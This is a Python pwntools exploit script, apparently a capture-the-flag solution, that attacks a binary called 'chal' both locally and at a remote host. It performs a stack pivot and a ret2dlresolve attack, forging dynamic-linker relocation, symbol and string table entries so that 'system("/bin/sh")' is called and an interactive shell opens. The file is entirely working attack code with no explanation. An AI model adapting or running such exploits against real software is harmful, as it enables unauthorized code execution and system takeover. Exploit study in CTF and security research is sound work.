from pwn import *

exe = './chal'

(host,port_num) = ("2a09:8280:1::3d:da94:0", 5000)

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug(
            [exe] + argv, gdbscript=gscpt, *a, **kw)
    elif args.RE:
        return remote(host,port_num)
    elif args.LOCAL:
        return remote("localhost", 5000)
    else:
        return process( 
            [exe] + argv, *a, **kw)
    
gscpt = (
    '''
b * main
set follow-fork-mode parent
'''
).format(**locals())

context.update(arch='amd64')

# SHORTHANDS FOR FNCS
se  = lambda nbytes     : p.send(nbytes)
sl  = lambda nbytes     : p.sendline(nbytes)
sa  = lambda msg,nbytes : p.sendafter(msg,nbytes)
sla = lambda msg,nbytes : p.sendlineafter(msg,nbytes)
rv  = lambda nbytes     : p.recv(nbytes)
rvu = lambda msg        : p.recvuntil(msg)
rvl = lambda            : p.recvline()

# SIMPLE PRETTY PRINTER
def w(*args):
    print(f"〔\033[1;32m>\033[0m〕",end="")
    for i in args:
        print(hex(i)) if(type(i) == int) else print(i,end=" ")
    print("")

# PWNTOOLS CONTEXT
# context.log_level = \
#     'DEBUG'

# _____________________________________________________ #
# <<<<<<<<<<<<<<< EXPLOIT STARTS HERE >>>>>>>>>>>>>>>>> #

p = start()

main = 0x401126
trampoline = 0x401020
strtab = 0x400470
symtab = 0x4003e0
jmprel = 0x400590
bss    = 0x404000
pivot_addr = 0x404c00
got = 0x404000
# current address = 0x404608
# jmprel size = 0x18
inf = 0x401001

payload = 0xd*b"a" + p64(pivot_addr) + p64(main+4)
sl(payload)

payload = (b"/bin/sh\x00" + 0x5*b"a" + p64(pivot_addr+0x70) + p64(inf) + 
           p64(((pivot_addr + 0x28) - jmprel)//0x18) + # index to loader jmprel
           2*p64(main+4) +
           # JMPREL = 0x404628
           p64(got) + # r_offset   
           p32(0x7) + p32(((pivot_addr + 0x48) - symtab)//0x18) + 
           # SYMTAB = 0x404640
           p64(0xdeadbeef) +
           p64((pivot_addr + 0x58) - strtab) + # st_value
           2*p64(0x0) + 
           # STRTAB = 0x40658
           b"system".ljust(8,b"\x00") +
           b"aaa/bin/sh\x00"
           )
sl(payload)

p.interactive()